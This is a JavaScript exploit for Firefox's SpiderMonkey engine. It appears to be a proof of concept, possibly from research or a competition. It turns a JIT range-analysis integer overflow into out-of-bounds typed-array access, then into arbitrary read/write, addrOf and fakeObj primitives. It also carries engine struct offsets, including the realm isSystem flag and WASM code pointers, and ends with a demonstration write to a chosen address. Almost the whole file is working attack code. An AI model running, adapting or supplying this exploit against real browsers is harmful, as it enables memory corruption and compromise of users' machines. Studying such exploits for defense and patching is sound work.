const PTR_MASK = 0xfffe000000000000n;
const DEBUG = 1;

class Utils {
    constructor() {        
        this._isBrowser = "document" in globalThis;
        this._buffer = new ArrayBuffer(8);
        this._uint64 = new BigUint64Array(this._buffer);
        this._double = new Float64Array(this._buffer);
        this._uint32 = new Uint32Array(this._buffer);
        this._uint8 = new Uint8Array(this._buffer);
    }
    
    get debug() {
        return DEBUG;
    }
    
    get isBrowser() {
        return this._isBrowser;
    }
    
    log(...args) {
        if (!this.debug) return;
        let s = "";
        for (const arg of args) {
            s += arg;
        }
        console.log(s);
        if (this.isBrowser) document.getElementById("log").innerText += s + "\n";
    }
    
    assert(cond, s = undefined) {
        if (cond) return;
        let err_string = "Assertion failed";
        if (s !== undefined) err_string += ": " + s;
        if (this.debug) {
            throw RangeError(err_string);        
        } else {
            this.log(err_string);
        }
    }
    
    assert_eq(a, b, s = undefined) {
        if (a == b) return;
        let err_string = "" + a + " == " + b;
        if (s !== undefined) err_string += ", " + s;
        this.assert(false, err_string);
    }
    
    assert_lt(a, b, s = undefined) {
        if (a < b) return;
        let err_string = "" + a + " == " + b;
        if (s !== undefined) err_string += ", " + s;
        this.assert(false, err_string);
    }
    
    dumpObject(obj) {
        if (!this.debug) return;
        if (this.isBrowser) {
            this.log("(dump ", typeof obj, ")");
        } else {
            dumpObject(obj);
        }
    }
    
    todo(s) {
        if (!this.debug) {
            throw Error("Todo encountered in release: " + s);
        }
        this.log("TODO: ", s);
    }
    
    numRepr(num) {
        if (typeof num === "bigint") {
            return "" + num + "n" + " (0x" + num.toString(16) + " -> " + this.int64ToDouble(num) + ")";
        } else if (typeof num === "number") {
            return "" + num + " ( -> 0x" + this.doubleToInt64(num).toString(16) + ")";
        }
        return "" + num;
    }
    
    logIdx(idx, val, name = undefined, prefix = "") {
        if (name === undefined) {
            this.log(prefix, idx, ": ", this.numRepr(val));
        } else {
            this.log(prefix, name, "[", idx, "] = ", this.numRepr(val));
        }
    }
    
    logAddr(name, addr) {
        this.log(name," @ ", this.hex64(addr));
    }
    
    logRelSlice(array, offset = 0, start = 0, end = undefined, name = undefined) {
        if (!this.debug) return;
        if (end === undefined) {
            end = array.length - offset;
        }
        this.log("Logging ", (name === undefined ? "" : name + " "), offset != 0 ? " with offset " + offset : "");
        for (let i = start; i < end; i++) {
            this.logIdx(i, array[offset+i], name, "  ");
        }
    }
    
    logArbRead(fun, addr, length = 1, incr = 8, name = undefined, formatter = undefined, rawDump = false) {
        if (!this.debug) return;
        const incr_big = BigInt(incr);
        const add64 = this.safeToInt64(addr);
        this.log("Reading ", Number(length) * Number(incr), " bytes @ addr ", this.hex64(addr));
        let pos = addr;
        let n = 0n;
        let dump = "";
        for (let i = 0; i < length; i += 1) {
            let val = fun(this.safeToInt64(pos));
            let pos_str = (name === undefined) ? "*" + this.hex64(pos) + " (+" + n + ")": this.hex64(pos) +" (" + name + "[" + n  + "])";
            let val_str = (formatter === undefined) ? this.numRepr(val) : formatter(val);
            if (rawDump) {
                dump += val_str;
            } else {
                this.log("  ", pos_str, " = ", val_str);
            }
            pos += incr_big;
            n += incr_big;
        }
        if (rawDump) this.log(dump);
    }
    
    safeToInt64(val) {
        if (typeof val === "bigint") {
            if (val < 0n || val >= 2n**64n) {
                throw RangeError("Value " + val + " out of Uint64 range");
            }
            return val;
        }
        if (val < 0 || val > Number.MAX_SAFE_INTEGER) {
            throw RangeError("Value " + val + "  out of safe integer range during conversion to BigInt64");
        }
        return BigInt(val);
    }
    
    safeToInt32(val) {
        if (val < 0 || val >= 2**32) {
            throw RangeError("Value " + val + " out of UInt32 range");
        }
        return BigInt(val);
    }
    
    hex(num, doPrefix = true) {
        return (doPrefix ? "0x" : "") + BigInt(num).toString(16);
    }
    hex8(num, doPrefix = true) {
        return (doPrefix ? "0x" : "") + BigInt(num).toString(16).padStart(2,"0");
    }    
    hex32(num, doPrefix = true) {
        return (doPrefix ? "0x" : "") + this.safeToInt32(num).toString(16).padStart(8, "0");
    }
    
    hex64(num, doPrefix = true) {
        return (doPrefix ? "0x" : "") + this.safeToInt64(num).toString(16).padStart(16, "0");
    }
    
    hexdump(arr, idx) {
        if (!idx) idx = 0;
        let line = "";
        for (let i = 0; i < arr.length; i++) {
            if ((i & 63) == 0) {
                if (line) this.log(line);
                line = this.hex64(idx+i)+": ";
            } else if ((i & 7) == 0) {
                line += " ";
            }
            line += this.hex8(arr[i],false);
        }
        this.log(line);
    }
    
    doubleToInt64(double) {
        this._double[0] = double;
        return this._uint64[0];
    }
    
    int64ToDouble(bigint) {
        this._uint64[0] = this.safeToInt64(bigint);
        return this._double[0];
    }
    
    doubleToInt32Pair(double) {
        this._double[0] = double;
        const high = BigInt(this._uint32[0]);
        const low = BigInt(this._uint32[1]);
        return [low, high];
    }    
    
    int32PairToDouble([low, high]) {
        this._uint32[0] = Number(this.safeToInt32(high));
        this._uint32[1] = Number(this.safeToInt32(low));
        return this._double[0];
    }
    
    int64ToBytes(val) {
        let val64 = this.safeToInt64(val);
        this._uint64[0] = val64;
        let res = new Array(8n);
        for (var i = 0n; i < 8n; i++) res[i] = this._uint8[i];
        return res;
    }
    
    asciiStrToTerminatedUint8(str) {
        let arr = new Array(str.length + 1);
        for (let i = 0; i < str.length; i++) arr[i] = str.charCodeAt(i);
        arr[str.length] = 0;
        return Uint8Array.from(arr);
    }
    
    valIsPtr(val) {
        return this.safeToInt64(val) >= PTR_MASK;
    }
    
    maskPtr(val) {
        let val64 = this.safeToInt64(val);
        if (val64 >= PTR_MASK) {
            throw RangeError("Value " + this.hex64(val64) + " is not a valid pointer. Is it already masked?");
        }
        return val64 | PTR_MASK;
    }
    
    maskRawNumValue(val) {
        let val64 = this.safeToInt64(val);
        if (val64 >= PTR_MASK) {
            throw RangeError("Value " + this.hex64(val64) + " is not a valid number-value.");
        }
        return val64;
    }
    
    maskDoubleValue(val) {
        return this.maskRawNumValue(this.doubleToInt64(val));
    }
    
    unmaskPtr(val) {
        let val64 = this.safeToInt64(val);
        if ((val64 & PTR_MASK) != PTR_MASK) {
            throw RangeError("Value " + this.hex64(val64) + " is not a masked pointer!");
        }
        return val64 & ~PTR_MASK;
    }
    
    unmaskInt(val) {
        let val64 = this.safeToInt64(val);
        if ((val64 & PTR_MASK) != 0) {
            throw RangeError("Value " + this.hex64(val64) + " is not a masked pointer!");
        }
        return val64;
    }
    
    unmaskDoubleValue(val) {
        return this.int64ToDouble(this.unmaskInt(val));
    }
    
    reverseEndian64(val) {
        let val64 = this.safeToInt64(val);
        let ret = 0n;
        for (let i = 0; i < 8; i++) {
            ret <<= 8n;
            ret += val64 & 0xffn;
            val64 >>= 8n;
        }
        return ret;
    }
    
    async readFile(name) {
        if (this.isBrowser) {
            const response = await fetch(name, {cache: "no-cache"});
            const ab = new Uint8Array(await response.arrayBuffer());
            const ab2 = ab.slice();
            return ab2;
        }
        return readFile(name, "binary").buffer.slice();
    }
    
    sleepForDebugger() {
        if (this.isBrowser) return;
        globalThis.readline();
    }
    
    str8ToInt64LE(s) {
        this.assert_eq(s.length, 8, "invalid string length for str8ToInt64LE");
        for (let i = 0; i < 8; i++) {
            let a = s.charCodeAt(i);
            this.assert(a<256, "non-byte char in string");
            this._uint8[7-i] = a;
        }
        return this._uint64[0];
    }
    
    randomLocalhost() {
        return "127.0.0.1";
        let comp = (_=>(1+255*Math.random())&255);
        return "127."+comp()+"."+comp()+"."+comp()
    }
    
    setTitle(title) {
        document.getElementsByTagName("title")[0].innerText = title;
    }
    
    getParam(param, defaultVal=undefined) {
        let s = globalThis.window.location.search;
        if (s[0] == "?") s = s.substring(1);
        for (let keyval of s.split("&")) {
            let [key,val] = keyval.split("=");
            if (key == param) return val;
        }
        return defaultVal;
    }
    
    getExploitURL() {
        return globalThis.window.location.origin+"/index.html";
    }
}
const utils = new Utils();

class Consts {
    constructor() {
        // TODO rename
        this.OBJECT_SHAPE_OFFSET = 0n;
        this.OBJECT_SLOTS_OFFSET = 8n;
        this.OBJECT_FIXED_SLOTS_OFFSET = 24n;
        
        // source/js/src/vm/ArrayBufferObject.h
        this.ARRAYBUF_DATA_SLOT = 0n;
        this.ARRAYBUF_BYTE_LENGTH_SLOT = 1n;
        this.ARRAYBUF_FIRST_VIEW_SLOT = 2n;
        this.ARRAYBUF_FLAGS_SLOT = 3n;
        this.ARRAYBUF_RESERVED_SLOTS = 4n;
        
        this.ARRAYBUF_FLAGS_KIND_MASK = 0b111n;
        this.ARRAYBUF_FLAGS_KIND_INLINE_DATA = 0b000n;
        this.ARRAYBUF_FLAGS_KIND_USER_OWNED = 0b011n;
        
        this.SHAPE_OFF_BASESHAPE = 0n;
        this.SHAPE_OFF_FLAGS = 8n;
        this.SHAPE_KIND_SHIFT = 4n;
        this.SHAPE_KIND_MASK = 0b11n;
        this.SHAPE_KIND_PROXY = 0n;
        
        // ptype /o js::BaseShape
        this.BASESHAPE_OFF_REALM = 8n; // realm_
        this.BASESHAPE_OFF_PROTOTYPE = 16n;
        
        // ptype /o JS::Realm
        this.REALM_OFF_COMPARTMENT = 0n; // NOT included in ptype, defined in JS::shadow::Realm
        this.REALM_OFF_RUNTIME = 16n; // runtime_
        this.REALM_OFF_GLOBAL = 96n;
        this.REALM_OFF_ISSYSTEM = 532n; // isSystem_ // UPDATE NOTICE 532n for 123, 524n for 124 (beta)
        
        // ptype /o JSRuntime
        this.RUNTIME_OFF_MAINCONTEXT = 112n; // mainContext_
        
        // ptype /o JS::Compartment
        this.COMPARTMENT_OFF_DATA = 112n; // data
        
        // ptype /o xpc::CompartmentPrivate
        this.COMPARTMENTPRIVATE_OFF_SCOPE = 64n; // scope
        
        // ProxyValueArray (not found with ptype, look at /source/js/public/Proxy.h)
        this.PROXYVALUARRAY_OFF_PRIVATESLOT = 8n; // privateSlot
        this.PROXYVALUEARRAY_OFF_RESERVEDSLOTS = 16n; // reservedSlots
        

    
        this.FIXED_SLOTS_SHIFT =  5n;
        this.FIXED_SLOTS_MASK = 0x1fn << this.FIXED_SLOTS_SHIFT;
    
        this.WASM_INSTANCEOBJ_SLOT_INSTANCE = 0n;
        
        this.WASM_MODULEOBJ_SLOT_MODULE = 0n;
        
        this.WASM_MODULE_OFF_CODE = 16n;
        
        // ptype /o js::wasm::Code
        this.WASM_CODE_OFF_TIER1 = 8n; // tier1_
        
        // ptype /o js::wasm::CodeTier
        this.WASM_CODETIER_OFF_METADATA = 8n; // metadata_        
        this.WASM_CODETIER_OFF_SEGMENT = 16n; // segment_
        
        // ptype /o js::wasm::CodeSegment
        // (from superclass js::wasm::ModuleSegment)
        this.WASM_SEGMENT_OFF_CODE = 0n; // bytes_
        
        // ptype /o js::wasm::MetadataTier
        this.WASM_METADATA_OFF_EXPORTSBEGIN = 448n; // funcExports (+ mBegin in js::wasm::FuncExportVector)
        
        // ptype /o js::wasm::FuncExport
        this.WASM_FUNCEXPORT_OFF_ENTRY = 8n; // ptype /o js::wasm::FuncExport
        
        this.ARRAY_MARKER_MAGIC = 0x666e616d7962333cn;
        this.SHELLCODE_MARKER_MAGIC = 0x666e616d37130542n;
    }
    
}

const consts = new Consts();

const OOB_LEN = 50;
const TYPED_LEN = 0x1337;
const CONST_ELEM = 1.2141768888250467e+30;
const CONST_SLOT = 4.942181223747052e+29;

const TYPEDARRAY_OFFSET_LEN_REL_OOBARRAY = 27n; // undefined for auto
const TYPEDARRAY_OFFSET_DATA_REL_LEN = 2n;
const TYPEDARRAY_OFFSET_SLOTS_REL_LEN = -3n;

const ARRAYBUF_OFFSET_SLOTS = 8n;
const ARRAYBUF_OFFSET_DATA = 24n;
const ARRAYBUF_OFFSET_LEN = 32n;

function exploit(foo,bar,x,startIdx,endIdx,out,flag,write) {
    /* the following addition overflows, even though the compiler thinks it cannot.
     * this results in a negative value with an assigned range that is non-negative:
     */
    let neg = Object.keys(x).length+1879048190; // type >= 0, actually negative
    neg = Math.max(neg, (startIdx-40)|0); // type >=0, actually startIdx-40
    neg = Math.min(neg, 0); // type [0,0], actually startIdx-40
    let idx = 31; 

    let res = 1234;
    let res2 = 0;
    for (let i = neg; i <= 20; i++) { // compiler thinks these are <=20 iterations, actually 60-startIdx
        idx -= 1; // compiler thinks this can never be below 31-20 > 0
        if (startIdx <= idx && idx < endIdx) {
            let toWrite = out[idx-startIdx];
            out[idx-startIdx] = foo[idx];
            if (write) {
                foo[idx] = toWrite;
            }
            if (flag) {
                res2 = bar[(idx&2)>>1][idx];
            }

        }
    }
    return res2*10000+res;
}


class MemoryAccess {
    constructor() {
        this._buffer64 = new ArrayBuffer(8);
        this._buffer64_8 = new Uint8Array(this._buffer64);
        this._buffer64_64 = new BigUint64Array(this._buffer64);
        
        let long_array = new Uint8Array(2**28-4);
        long_array.a = 5; long_array.b = 5; long_array.c = 5; long_array.d = 5; long_array.e = 5; long_array.f = 5;
        utils.log("Array built");
        this.long_array = long_array;
        
        let res = 0;
        let arr = new Uint8Array(64);
        arr.a=7;arr.b=7;arr.c=7;arr.d=7;arr.e=7;arr.f=7;
        let foo = new Uint8Array(64);
        let bar = new Uint8Array(64);
        let out = new Uint8Array(64);
        for (let i = 0; i < 2000000; i++) {
            res = exploit(foo,[bar,bar],arr, 30+(i%5),60+(i%5),out,i&1,i&3);
        }
        this._bar = bar;
        utils.log("trained");
        
        let target1_buf = new ArrayBuffer(64);
        let target2_buf = new ArrayBuffer(64);

        let target1 = new Uint8Array(target1_buf);
        let target2 = new BigUint64Array(target2_buf);
             
        //target2[1] = {};        
        target2[0] = consts.ARRAY_MARKER_MAGIC;
        
        
        if (utils.debug) utils.assert_eq(this._readOOB64(target1,-24), BigInt(target1.length), "readback of target len failed");
        let newlen = 4096n;        
        this._writeOOB64(target1, -24, newlen);
        target1 = new Uint8Array(target1_buf);
        utils.assert_eq(target1.length, newlen, "overwrite of target len failed");                

                
        let target2_idx = undefined;
        let target1_64 = new BigUint64Array(target1.buffer);
        utils.log("len1: "+target1_64.length);
        for (let i = 0n; i < target1_64.length; i++) {
            if (target1_64[i] === consts.ARRAY_MARKER_MAGIC) {
                target2_idx = i;
                break;
            }
        }
        utils.log("target2 idx: ",target2_idx);
        utils.assert(target2_idx !== undefined, "could not find target2");

        this._target1 = target1;
        this._target1_64 = target1_64;
        this._target2 = target2_buf
        this._target2_slots_idx = target2_idx - consts.ARRAYBUF_RESERVED_SLOTS;
        this._target2_orig_flags = target1_64[this._target2_slots_idx + consts.ARRAYBUF_FLAGS_SLOT];
        this._target2_orig_data = target1_64[this._target2_slots_idx + consts.ARRAYBUF_DATA_SLOT];
        this._target2_view_addr = utils.unmaskPtr(target1_64[this._target2_slots_idx + consts.ARRAYBUF_FIRST_VIEW_SLOT]);
        this._target2_shape = target1_64[this._target2_slots_idx+(consts.OBJECT_SHAPE_OFFSET-consts.OBJECT_FIXED_SLOTS_OFFSET)/8n];

        let obj = new ArrayBuffer(1024);
        obj.fakeObjThingy = 1337.424242;

        let objSlots = this._addrOf(obj)+consts.OBJECT_SLOTS_OFFSET;
        let objAddr = this.arbRead64(objSlots);
        utils.assert_eq(this.arbRead64(objAddr), utils.doubleToInt64(1337.424242));
        this.obj = obj;
        this.objAddr = objAddr;
       
    }
    
    cleanup() {
        this._resetTarget2();
        this._writeOOB64(this.target1, -24, 64n);
    }
    
    _setAddr(addr) {
        this._assertAlignment(addr);
        addr = utils.safeToInt64(addr);
        let flags = (this._target2_orig_flags & ~consts.ARRAYBUF_FLAGS_KIND_MASK) | consts.ARRAYBUF_FLAGS_KIND_USER_OWNED;
        this._target1_64[this._target2_slots_idx + consts.ARRAYBUF_FLAGS_SLOT] = flags;
        this._target1_64[this._target2_slots_idx + consts.ARRAYBUF_DATA_SLOT] = addr;
    }
    
    _resetAddr() {
        this._target1_64[this._target2_slots_idx + consts.ARRAYBUF_FLAGS_SLOT] = this._target2_orig_flags;
        this._target1_64[this._target2_slots_idx + consts.ARRAYBUF_DATA_SLOT] = this._target2_orig_data;
    }
    
    _assertAlignment(addr, align=8) {
        utils.assert_eq(addr % BigInt(align), 0, "Address not aligned to " + align + " bytes");
    }
    
    _readOOB(target,idx,out) {
        exploit(target,[this._bar,this._bar],this.long_array,idx,idx+out.length,out,0,0);
    }
    _writeOOB(target,idx,out) {
        exploit(target,[this._bar,this._bar],this.long_array,idx,idx+out.length,out,0,1);
    }
    _readOOB64(target, idx) {
        this._readOOB(target, idx, this._buffer64_8);
        return this._buffer64_64[0];
    }
    _writeOOB64(target, idx, value) {
        this._buffer64_64[0] = utils.safeToInt64(value);
        this._writeOOB(target, idx, this._buffer64_8);
    }
    
    
    
    arbRead64(addr) {
        this._setAddr(addr);
        const res = (new BigUint64Array(this._target2))[0];
        this._resetAddr();
        return res;
    }
    
    arbWrite64(addr, value) {
        this._setAddr(addr);
        (new BigUint64Array(this._target2))[0] = utils.safeToInt64(value);
        this._resetAddr();
    }
   
    arbRead32(addr) {
        this._assertAlignment(addr, 4);
        let r = this.arbRead64(addr & (~7n));
        r >>= 8n*(addr & 7n);
        return r & 0xffffFFFFn        
    }
    
    arbWrite32(addr, val) { // non-atomic!
        let val32 = utils.safeToInt32(val);
        this._assertAlignment(addr, 4);
        let v = this.arbRead64(addr & (~7n));
        let mask = 0xffffFFFFn;
        let shift = 8n * (addr & 7n);
        v = (v & ~(mask << shift)) | (val32 << shift);
        this.arbWrite64(addr & (~7n), v);
    }
    
    arbRead16(addr) {
        this._assertAlignment(addr, 2);
        let r = this.arbRead64(addr & (~7n));
        r >>= 8n*(addr & 7n);
        return r & 0xffFFn;
    }
    
    arbRead8(addr) {
        let r = this.arbRead64(addr & (~7n));
        r >>= 8n*(addr & 7n);
        return r & 0xFFn;
    }
    
    arbWrite8(addr, val) { // non-atomic!
        let val8 = BigInt(val) & 0xFFn;
        let v = this.arbRead64(addr & (~7n));
        let mask = 0xFFn;
        let shift = 8n * (addr & 7n);
        v = (v & ~(mask << shift)) | (val8  << shift);
        this.arbWrite64(addr & (~7n), v);
    }

    
    _addrOfRaw(obj) {
        this._target2.buffer.__proto__ = obj;
        return this._target1_64[this._target2_idx];
    }
    
    _addrOf(obj) {
        let proto_orig = this._target2.__proto__;
        this._target2.__proto__ = obj;
        let shape = this._target1_64[this._target2_slots_idx+(consts.OBJECT_SHAPE_OFFSET-consts.OBJECT_FIXED_SLOTS_OFFSET)/8n];
        let base_shape = this.arbRead64(shape + consts.SHAPE_OFF_BASESHAPE);
        let proto_addr = this.arbRead64(base_shape + consts.BASESHAPE_OFF_PROTOTYPE);
        this._target2.__proto__ = proto_orig;
        return proto_addr;
    }
    
    addrOfRaw(val) {
        this.obj.fakeObjThingy = val;
        const res = this.arbRead64(this.objAddr);
        this.obj.fakeObjThingy = 1337.5;
        return res;
    }
    
    addrOf(val) {
        return utils.unmaskPtr(this.addrOfRaw(val))
    }
    
    
    fakeObjRaw(addr) {
        this.arbWrite64(this.objAddr, addr);
        const res = this.obj.fakeObjThingy;
        this.arbWrite64(this.objAddr, utils.doubleToInt64(1337.5));
        return res;
    }
    
    fakeObj(addr) {
        return this.fakeObjRaw(utils.maskPtr(addr));
    }    
    
    getShapePtr(obj) {
        return this.arbRead64(this.addrOf(obj) + consts.OBJECT_SHAPE_OFFSET);
    }
    
    getFixedSlotsPtr(obj) {
        return this.addrOf(obj) + consts.OBJECT_FIXED_SLOTS_OFFSET;
    }
    
    getSlotsPtr(obj) {
        return this.arbRead64(this.addrOf(obj) + consts.OBJECT_SLOTS_OFFSET);
    }
    
    _readBytes8(addr) {
        let res = this.arbRead64(addr);
        return utils.int64ToBytes(res);
    }
    
    readBytes(addr, num) {
        let addr64 = utils.safeToInt64(addr);
        let num64 = utils.safeToInt64(num);
        let pos = addr64 & (~7n);
        let pre_align = addr64 & 7n;
        let to_read = num64 + pre_align;
        let res = [];
        for (let i = 0n; i < to_read; i+=8n) {
            res = res.concat(this._readBytes8(pos));
            pos += 8n;
        }
        return res.slice(Number(pre_align), Number(pre_align + num64));
    }
    
    readStrN(addr, num) {
        return String.fromCharCode(...this.readBytes(addr, num));
    }
    
    readBytesTerminated(addr, terminator = 0) {
        let addr64 = utils.safeToInt64(addr);
        let pos = addr64 & (~7n);
        let pre_align = addr64 & 7n;
        let res = [];
        let first = true;
        while (1) {
            let v = this._readBytes8(pos);
            let f = v.indexOf(terminator, first ? Number(pre_align) : 0)
            if (f !== -1) {
                v = v.slice(0, f);
            }
            res = res.concat(v);
            if (f !== -1) return res.slice(Number(pre_align));
            pos += 8n;
            first = false;
        }
    }
    
    readStrTerminated(addr) {
        return String.fromCharCode(...this.readBytesTerminated(addr, 0));
    }
    
    readFixedSlot(obj, slot) {
        const slot_addr = this.getFixedSlotsPtr(obj) + BigInt(slot) * 8n;
        return this.arbRead64(slot_addr);
    }
    
    writeFixedSlot(obj, slot, value) {
        const slot_addr = this.getFixedSlotsPtr(obj) + BigInt(slot) * 8n;
        this.arbWrite64(slot_addr, value);    
    }
    
    arrayBufferPtr(buffer) {
        return this.arbRead64(this.addrOf(buffer) + consts.OBJECT_FIXED_SLOTS_OFFSET + 8n*consts.ARRAYBUF_DATA_SLOT)
    }
    
    typedArrayPtr(arr) {
        return this.arrayBufferPtr(arr.buffer);
    }
    
    logMem(addr, length = 1, name = undefined) {
        utils.logArbRead((x => this.arbRead64(x)), addr, length, 8, name, (x => utils.hex64(x) + " (" + utils.int64ToDouble(x) + ")"));
    }
    
    logMemRaw(addr, length = 1) {
        utils.assert(BigInt(length) % 8n == 0, "currently support dumping only in multiples of 8");
        utils.logArbRead((x => this.arbRead64(x)), addr, (BigInt(length) / 8n), 8, "", (x => utils.hex64(utils.reverseEndian64(x),false)), true);
    }
    
    unwrapProxyAddrToAddr(addr) {
        let slots = this.arbRead64(addr + consts.OBJECT_SLOTS_OFFSET);
        let valArray = slots - consts.PROXYVALUEARRAY_OFF_RESERVEDSLOTS;
        return mem.arbRead64(valArray + consts.PROXYVALUARRAY_OFF_PRIVATESLOT);
    }
    
    unwrapProxyAddr(addr) {

        return this.fakeObjRaw(this.unwrapProxyAddrToAddr(addr));    
    }

    unwrapProxy(obj) {
        return this.unwrapProxyAddr(this.addrOf(obj));
    }
    
    isProxy(obj) {
        let shape = this.getShapePtr(obj);
        let flags = this.arbRead32(shape+consts.SHAPE_OFF_FLAGS);
        let kind = (flags >> consts.SHAPE_KIND_SHIFT) & consts.SHAPE_KIND_MASK;
        return kind === consts.SHAPE_KIND_PROXY;
    }
    
    unwrapProxyIf(obj) {
        if (this.isProxy(obj)) {
            return this.unwrapProxy(obj);
        }
        return obj;
    }
    
    getRealmAddr(obj) {
        const shape = this.arbRead64(mem.addrOf(obj) + consts.OBJECT_SHAPE_OFFSET);
        const base = this.arbRead64(shape + consts.SHAPE_OFF_BASESHAPE);
        return this.arbRead64(base + consts.BASESHAPE_OFF_REALM);
    }
    
    getGlobal(obj) {
        const realm = this.getRealmAddr(obj);
        const globalAddr = this.arbRead64(realm + consts.REALM_OFF_GLOBAL);
        return this.fakeObj(globalAddr)
    }

    
    crash() {
        // Demonstrate the arbitrary-address write primitive.  The address is
        // 8-aligned and a canonical user-mode value (47-bit) so SpiderMonkey's
        // debug-build IsValidUserModePointer guard accepts it; ASAN then
        // catches the SEGV at the chosen address.
        this.arbWrite64(0x0000414141414140n, 1337n);
    }
    
}
let mem = new MemoryAccess();
mem.crash();
